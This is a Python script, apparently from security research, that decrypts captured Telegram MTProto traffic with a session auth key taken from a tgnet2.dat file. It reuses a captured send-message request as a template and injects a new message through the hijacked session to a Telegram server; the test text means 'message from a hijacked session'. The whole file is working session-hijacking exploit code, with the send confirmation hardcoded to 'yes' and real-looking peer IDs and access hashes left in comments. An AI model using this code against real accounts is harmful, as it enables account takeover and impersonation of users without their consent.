from pyrogram.raw.types import MsgsAck, UpdateShort
from telethon.tl.functions import PingDelayDisconnectRequest
from telethon.tl.functions.messages import SendMessageRequest

from src.MtprotoSession import KeyNotFoundException
from read_capture import *


def send_edited_message(data : str, last_outgoing_message :TGMessage, template_message, peer_id_and_hash = (None, None)):
    session = last_outgoing_message.session

    template_message.message = data
    template_message.random_id = -1 * random.randrange(0, 1<<63)
    # decoded_message.peer.user_id = 740952845
    if peer_id_and_hash[0] is not None and peer_id_and_hash[1] is not None:
        template_message.peer.user_id = peer_id_and_hash[0]
        template_message.peer.access_hash = peer_id_and_hash[1]
    # print(decoded_message)
    decoded_edited_message = bytes(template_message)
    tg_message_to_send = TGMessage(plaintext_bytes=bytearray(decoded_edited_message), session=session,
                                   msg_type="client_msg", silent=True, colored=True,
                                   instant=True, quickAck = True)

    print("MESSAGE TO SEND")
    print(tg_message_to_send)
    # print(to_hex_str(tg_message_to_send.message_data_plaintext))
    # print(deserialize_TL_message(decoded_edited_message).to_dict())
    cipher_obf_enc, cipher_obf_dec, init = create_obfuscation_ciphers(0xef)
    obfuscated_bytes = cipher_obf_enc.encrypt(tg_message_to_send.complete_bytes_ciphertext)

    init_and_obfuscated_bytes = init + obfuscated_bytes
    # confirm = input("Are you sure? yes/(no)")
    confirm = "yes"
    if confirm == "yes":
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(("149.154.167.91", 443))
        client_socket.send(init_and_obfuscated_bytes)
        print("\nMessage sent.")
        # sleep(3)

    cipher_obf_enc, cipher_obf_dec, init = derive_deobfuscation_ciphers(init_and_obfuscated_bytes)
    print(to_hex_str(init))
    deobfuscated_bytes = bytearray(cipher_obf_enc.decrypt(init_and_obfuscated_bytes[64:]))
    print(to_hex_str(tg_message_to_send.plaintext))
    message = TGMessage(ciphertext_bytes = deobfuscated_bytes, msg_type="client_msg", silent=True, colored=True, instant=True, session = MtprotoSession(session.auth_key))
    print(deserialize_TL_message(message.message_data_plaintext).to_dict())
    print(to_hex_str(message.plaintext))
    print(to_hex_str(last_outgoing_message.seqNo))

    print("Salt:")
    print(to_hex_str(message.session.salt))
    print("Session ID:")
    print(to_hex_str(message.session.session_id))
    print("SeqNo:")
    print(bytes_to_int(message.seqNo, little= True))



def main():
    template_send_message = None
    stream_n = 2
    streams_with_outgoing_traffic = []
    streams = []
    last_normal_stream = 0
    for i in range(100):
        print("")
        print(f"Stream {i}\n")
        try:
            dir = 0

            stream = (read_stream(str(f"capture/stream_{i}_out"), str(f"capture/stream_{i}_in"), False, False))
            streams.append(stream)

            if len(stream[0]) > 0 and dir == 0 and  hasattr(stream[0][0].session,"key_name") and stream[0][0].session.key_name == "tgnet2.dat":
                streams_with_outgoing_traffic.append(stream)
            for direction in stream:
                print("INCOMING:" if dir > 0 else "OUTGOING:")
                for message in direction:
                    print (message)
                    print("---------------------------------------------------")

                    if isinstance(message.deserialized_message, SendMessageRequest):
                        template_send_message = message
                    if (dir == 0  and hasattr(message.session,"key_name") and message.session.key_name == "tgnet2.dat" and not isinstance(message.deserialized_message, PingDelayDisconnectRequest)):
                        last_normal_stream = i
                dir = 1
        except KeyNotFoundException as e:
            print("(stream is irrelevant)") # stream is irrelevant
        except FileNotFoundError:
            break # no more streams to examine
    override_template = False
    if template_send_message is not None and override_template:
        with open("template", "w") as file:
            file.write(to_hex_str(bytes(template_send_message.deserialized_message), False))
    try:
        with open("template", "r") as file:
            template_send_message = deserialize_TL_message(bytes.fromhex(file.read()))
            # send_edited_message("messaggio da una sessione dirottata",streams_with_outgoing_traffic[-1][0][-1], template_send_message, (1345874644, -7249264267762180610)) #m
            ####### send_edited_message("messaggio da una sessione dirottata",streams_with_outgoing_traffic[-1][0][-1], template_send_message, (70027891, -3959112350778582311)) #t
            send_edited_message("messaggio da una sessione dirottata",streams[last_normal_stream][0][-1], template_send_message )
            print("stream for session: ",last_normal_stream)
            # send_edited_message("messaggio da una sessione dirottata",streams_with_outgoing_traffic[-1][0][-1], template_send_message )

    except Exception as e:
        print("Template not found or invalid")



    # if template_send_message is None:
    #     print("Error, no template message found")
    # else:
    #     send_edited_message("messaggio da una sessione hijackata", outgoing_messages[-1], template_send_message)
    #     pass


if __name__ == "__main__":
    main()